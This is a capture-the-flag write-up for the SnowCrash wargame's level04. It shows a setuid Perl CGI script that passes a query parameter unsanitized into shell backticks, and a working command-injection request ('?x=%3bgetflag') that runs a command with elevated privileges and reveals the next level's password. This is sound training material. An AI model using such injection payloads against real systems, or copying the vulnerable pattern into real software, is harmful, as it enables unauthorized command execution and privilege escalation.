# Objective

As `level04`, the goal is to exploit a vulnerability to gain `flag04`'s privileges and read the flag, which is the password for `level05`.

The flag is gained through the command `getflag`, run as `flag04`.

```sh
level04@SnowCrash:~$ ll -la /bin/getflag
-rwxr-xr-x 1 root root 11833 Aug 30  2015 /bin/getflag*
```

# Content of home

The home folder contains a `perl` script.

```sh
level04@SnowCrash:~$ pwd
/home/user/level04

level04@SnowCrash:~$ ll
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout*
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl*
-r-x------  1 level04 level04  675 Apr  3  2012 .profile*
```

# Resolution

### File analysis

```pl
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

The file suggests that a server listens on the port 4747.

```sh
State      Recv-Q Send-Q      Local Address:Port          Peer Address:Port   
LISTEN     0      128                    :::4747                    :::*
```

There's one!

It seems also that this server expects a query string with one parameter `x`.


### Exploit

The following line looks like some harm could be done via command injection.

```pl
  print `echo $y 2>&1`;
```

The backticks run the interpolated string through the shell, and `$y` is the unsanitized `x` parameter. Since the script runs setuid-setgid as `flag04`, any shell metacharacter (`;`, `|`, `` ` ``) we smuggle into `x` will execute with `flag04`'s privileges. Let us try passing the script a payload that chains the `getflag` command after the `echo`.

```sh
level04@SnowCrash:~$ telnet 127.1 4747
Trying 127.0.0.1...
Connected to 127.1.
Escape character is '^]'.
GET /?x=%3bgetflag HTTP/1.0

HTTP/1.1 200 OK
Date: Tue, 06 Oct 2026 14:58:47 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 59
Connection: close
Content-Type: text/html


Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
Connection closed by foreign host.

level04@SnowCrash:~$ su - level05
Password: # ne2searoevaevoem4ov4ar8ap
level05@SnowCrash:~$ 

```

Done!

